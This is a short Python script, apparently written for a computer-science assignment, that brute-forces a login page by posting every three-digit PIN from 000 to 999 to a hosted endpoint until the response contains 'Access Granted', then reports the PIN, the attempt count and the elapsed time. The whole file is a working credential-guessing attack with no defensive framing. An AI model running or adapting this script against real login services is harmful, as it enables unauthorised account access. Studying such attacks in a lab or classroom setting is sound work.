import requests
import time

target = "https://cs-assignment-3yo7.onrender.com/login"


def main():
    print(f"Starting brute force attack on: {target}")
    start_time = time.time()

    for i in range(1000):
        candidate = str(i).zfill(3)
        payload = {"pin": candidate}

        try:
            response = requests.post(target, json=payload, timeout=5)

            if response.status_code == 200 and "Access Granted" in response.text:
                elapsed = round(time.time() - start_time, 2)
                print(f"Password found: {candidate}")
                print(f"Attempts taken: {i + 1}")
                print(f"Time taken: {elapsed}s")
                return candidate

            if i % 100 == 0 and i > 0:
                print(f"Checked up to {candidate}")

        except requests.exceptions.RequestException as e:
            print(f"Request error on PIN {candidate}: {e}")
            break

    print("Brute force completed. Password not found.")
    return None


if __name__ == "__main__":
    main()
